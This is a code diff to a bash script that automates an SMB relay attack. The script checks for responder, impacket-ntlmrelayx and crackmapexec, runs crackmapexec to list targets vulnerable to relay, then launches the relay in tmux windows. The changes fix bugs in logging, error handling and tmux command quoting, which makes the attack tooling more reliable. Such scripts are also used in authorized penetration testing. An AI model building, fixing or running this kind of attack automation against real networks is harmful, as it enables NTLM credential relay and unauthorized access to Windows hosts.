@@ -75,8 +75,8 @@ log() {
     local level="$1"
     local msg="$2"
 
-    echo -e "[$level] $msg"
-    mkdir -p "$("$LOG_DIR" "$ATTACK_LOG")"
+    printf '[%s] %b\n' "$level" "$msg"
+    mkdir -p "$(dirname "$ATTACK_LOG")"
     echo "[$level] $(echo "$msg" | sed -r 's/\x1B\[[0-9;]*[mK]//g')" >> "$ATTACK_LOG"
 }
 
@@ -105,7 +105,7 @@ run_crackmapexec() {
     # Run crackmapexec and let it generate the relay list
     crackmapexec smb "${TARGET_FILE}" --gen-relay-list "${TARGET_SMB_FILE}" || {
         log ERROR "${RED}[!] crackmapexec failed. Exiting.${RESET}"
-        exit 1
+        return 1
     }
     
     if [ -s "${TARGET_SMB_FILE}" ]; then
@@ -148,7 +148,7 @@ start_tmux_window() {
         tmux new-window -t "$session_name" -n "$window_name"
     fi
 
-    tmux send-keys -t "$session_name:$window_name" "bash -c '$command'"
+    tmux send-keys -t "$session_name:$window_name" bash -c "$command"
     tmux send-keys -t "$session_name:$window_name" C-m
 }
 
@@ -270,7 +270,9 @@ check_tool "responder"
 check_tool "impacket-ntlmrelayx"
 check_tool "crackmapexec"
 
-run_crackmapexec
+if ! run_crackmapexec; then
+    exit 1
+fi
 
 if [ -s "${TARGET_SMB_FILE}" ]; then
     log SUCCESS "${GREEN}[+] Vulnerable targets found. Proceeding with SMB relay attack...${RESET}"
